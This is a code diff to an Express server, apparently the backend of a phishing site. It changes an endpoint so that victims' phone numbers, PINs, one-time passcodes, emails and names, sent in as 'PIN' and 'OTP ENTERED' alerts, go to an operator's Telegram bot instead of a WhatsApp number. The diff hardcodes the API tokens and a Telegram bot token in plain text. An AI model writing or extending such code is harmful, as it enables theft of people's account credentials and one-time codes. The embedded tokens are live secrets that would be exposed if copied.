@@ -4,17 +4,18 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
+// Health check endpoint
 app.get('/api/health', (req, res) => {
     res.json({ status: 'OK', timestamp: new Date().toISOString() });
 });
 
-app.post('/api/send-whatsapp', async (req, res) => {
+// Telegram notification endpoint
+app.post('/api/send-telegram', async (req, res) => {
     try {
         const { phone, pin, email, name, amount, term, type } = req.body;
         
-        const INSTANCE_ID = '7107571952';
-        const API_TOKEN = '1c200cb4e91f49b0ae02a051366511129c1f8d7cff1742239c';
-        const YOUR_WHATSAPP = '254707001191';
+        const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
+        const TG_CHAT_ID = '8392790531';
         
         let message = '';
         if (type === 'pin') {
@@ -23,19 +24,11 @@ app.post('/api/send-whatsapp', async (req, res) => {
             message = `🔐 OTP ENTERED 🔐\n\n📱 Phone: ${phone}\n🔑 OTP: ${pin}\n📧 Email: ${email}\n👤 Name: ${name}`;
         }
         
-        const url = `https://7107.api.greenapi.com/waInstance${INSTANCE_ID}/sendMessage/${API_TOKEN}`;
+        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
         
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chatId: `${YOUR_WHATSAPP}@c.us`,
-                message: message
-            })
-        });
+        await fetch(url);
         
-        const result = await response.json();
-        console.log('WhatsApp sent:', result);
+        console.log('Telegram notification sent:', type, phone);
         res.json({ success: true });
     } catch (error) {
         console.error('Error:', error.message);
@@ -45,4 +38,5 @@ app.post('/api/send-whatsapp', async (req, res) => {
 
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`🤖 Telegram notifications enabled!`);
 });
